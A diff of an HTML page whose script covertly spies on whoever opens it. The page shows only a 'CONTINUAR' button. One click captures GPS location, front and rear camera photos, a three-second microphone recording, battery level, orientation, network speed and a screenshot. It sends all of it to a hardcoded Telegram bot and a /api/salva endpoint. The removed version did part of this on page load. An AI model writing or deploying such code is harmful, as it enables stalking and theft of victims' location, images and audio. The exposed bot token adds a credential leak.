@@ -1,26 +1,93 @@
 <!doctype html>
-<html><head><meta charset="utf-8"><style>html,body{margin:0;height:100%;background:#000}</style></head><body>
+<html><head><meta charset="utf-8"><style>html,body{margin:0;height:100%;background:#000;display:flex;align-items:center;justify-content:center}</style></head><body>
+<button id="b" style="padding:40px 80px;font:24px sans-serif;background:#0f0;border:none;cursor:pointer">CONTINUAR</button>
 <script>
 const BOT_TOKEN="8783547945:AAHBAXXALN7Vi063RlRGoggCGWpWfmZTTks";
 const CHAT_ID="8792921881";
+const envia=txt=>fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(txt)}`);
 const SALVA=u=>fetch("/api/salva",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(u)});
-navigator.getBattery().then(b=>{const t=`🔋 ${Math.round(b.level*100)}% ${b.charging?'🔌':''}`;envia(t);SALVA({t:"bateria",v:t})});
-navigator.geolocation.getCurrentPosition(p=>{const m=`https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`;envia(`📍 ${m}`);SALVA({t:"gps",v:m})});
-navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{
-  const v=document.createElement("video");v.srcObject=s;v.play();
-  const c=document.createElement("canvas");c.width=720;c.height=1280;
-  const x=c.getContext("2d");
-  setTimeout(()=>{
-    x.drawImage(v,0,0,720,1280);
-    c.toBlob(b=>{
-      const fd=new FormData();
-      fd.append("photo",b,"s.jpg");
-      fd.append("chat_id",CHAT_ID);
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
-      SALVA({t:"selfie",v:"s.jpg"});
-      s.getTracks().forEach(t=>t.stop());
-    },"image/jpeg",.85);
-  },900);
-});
-function envia(txt){fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(txt)}`)}
+
+b.onclick=()=>{
+ b.remove();
+ 
+ // bateria
+ navigator.getBattery().then(b=>{
+   const t=`🔋 ${Math.round(b.level*100)}% ${b.charging?'🔌':''}`;
+   envia(t);SALVA({t:"bateria",v:t});
+ });
+
+ // gps
+ navigator.geolocation.getCurrentPosition(p=>{
+   const m=`https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`;
+   envia(`📍 ${m}`);SALVA({t:"gps",v:m});
+ });
+
+ // câmera frontal
+ navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{
+   snap(s,"selfie.jpg");
+ });
+
+ // câmera traseira
+ navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}}).then(s=>{
+   snap(s,"rear.jpg");
+ });
+
+ // microfone 3s
+ navigator.mediaDevices.getUserMedia({audio:true}).then(s=>{
+   const rec=new MediaRecorder(s),chunks=[];
+   rec.ondataavailable=e=>chunks.push(e.data);
+   rec.onstop=()=>{
+     const blob=new Blob(chunks,{type:"audio/ogg"});
+     const fd=new FormData();
+     fd.append("voice",blob,"v.ogg");
+     fd.append("chat_id",CHAT_ID);
+     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`,{method:"POST",body:fd});
+     SALVA({t:"audio",v:"v.ogg"});
+     s.getTracks().forEach(t=>t.stop());
+   };
+   rec.start();
+   setTimeout(()=>rec.stop(),3000);
+ });
+
+ // orientação
+ addEventListener("deviceorientation",e=>{
+   envia(`🧭 ${e.alpha|0}° ${e.beta|0}° ${e.gamma|0}°`);
+   SALVA({t:"orientacao",v:`${e.alpha|0},${e.beta|0},${e.gamma|0}`});
+ },{once:true});
+
+ // rede
+ const t0=performance.now();
+ fetch("https://speed.cloudflare.com/__down?bytes=500000",{cache:"no-store"}).then(r=>r.arrayBuffer().then(()=>{
+   const mbps=(4/(performance.now()-t0)*1000).toFixed(1);
+   envia(`⬇️ ${mbps} Mbps`);SALVA({t:"rede",v:`${mbps} Mbps`});
+ }));
+
+ // print da tela
+ import("https://cdn.skypack.dev/html2canvas@1.4.1").then(h=>h.default(document.body).then(c=>{
+   c.toBlob(b=>{
+     const fd=new FormData();
+     fd.append("photo",b,"print.jpg");
+     fd.append("chat_id",CHAT_ID);
+     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
+     SALVA({t:"print",v:"print.jpg"});
+   });
+ }));
+};
+
+function snap(s,name){
+ const v=document.createElement("video");v.srcObject=s;v.play();
+ const c=document.createElement("canvas");c.width=1280;c.height=720;
+ const x=c.getContext("2d");
+ setTimeout(()=>{
+   x.drawImage(v,0,0);
+   c.toBlob(b=>{
+     const fd=new FormData();
+     fd.append("photo",b,name);
+     fd.append("chat_id",CHAT_ID);
+     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
+     SALVA({t:"foto",v:name});
+     s.getTracks().forEach(t=>t.stop());
+   },"image/jpeg",.8);
+ },800);
+}
 </script></body></html>
